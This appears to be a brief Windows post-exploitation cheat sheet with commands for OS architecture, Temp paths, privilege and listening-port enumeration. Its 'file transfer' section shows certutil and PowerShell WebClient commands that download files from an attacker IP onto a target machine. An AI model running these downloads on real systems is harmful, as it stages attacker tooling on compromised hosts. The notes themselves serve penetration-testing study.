OS architecture 

```powershell
# https://docs.microsoft.com/en-us/dotnet/api/system.environment.is64bitoperatingsystem?view=net-6.0
[System.Environment]::Is64BitOperatingSystem
# without .Net
(gwmi Win32_OperatingSystem).OSArchitecture -eq '64-bit'
```

```cmd
(wmic os get osarchitecture)
```

AppData's Temp folder (%TEMP%)

```cmd
C:\Users\<User Account>\AppData\Local\Temp
C:\Windows\Temp
```

privileges information

```cmd
whoami /priv
whoami /all
```

check network connections 

```cmd
netstat -ano | findstr LISTEN
```

file transfer

```cmd
# on target 
certutil -urlcache -split -f "http://<target ip>/<file>" C:\Users\<User Account>\Desktop\<file>
PowerShell -c "(new-object System.Net.WebClient).DownloadFile('http://<attacker ip>/<file>', '<file>')"
```
